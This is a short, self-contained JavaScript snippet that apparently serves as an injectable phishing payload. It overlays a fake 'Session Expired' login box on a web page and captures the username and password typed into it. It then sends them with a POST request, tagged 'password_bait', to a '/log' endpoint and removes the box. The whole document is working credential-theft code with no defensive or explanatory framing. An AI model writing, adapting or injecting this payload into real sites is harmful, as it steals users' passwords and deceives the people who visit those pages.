(function () {
    const baitBox = document.createElement("div");
    baitBox.innerHTML = `
        <div style="position:fixed;top:30%;left:50%;transform:translate(-50%,-50%);
                    background:#fff;border:2px solid #000;padding:20px;z-index:9999;
                    box-shadow:0 0 10px rgba(0,0,0,0.5);font-family:sans-serif">
            <h3>Session Expired</h3>
            <p>Your session has expired. Please re-enter your password to continue.</p>
            <input id="phish-user" type="text" placeholder="Username" style="display:block;margin-bottom:10px;width:100%"/>
            <input id="phish-pass" type="password" placeholder="Password" style="display:block;margin-bottom:10px;width:100%"/>
            <button id="phish-submit">Login</button>
        </div>
    `;
    document.body.appendChild(baitBox);

    document.getElementById("phish-submit").addEventListener("click", () => {
        const username = document.getElementById("phish-user").value;
        const password = document.getElementById("phish-pass").value;

        fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                type: "password_bait",
                data: { username, password }
            })
        });

        baitBox.remove();
    });
})();
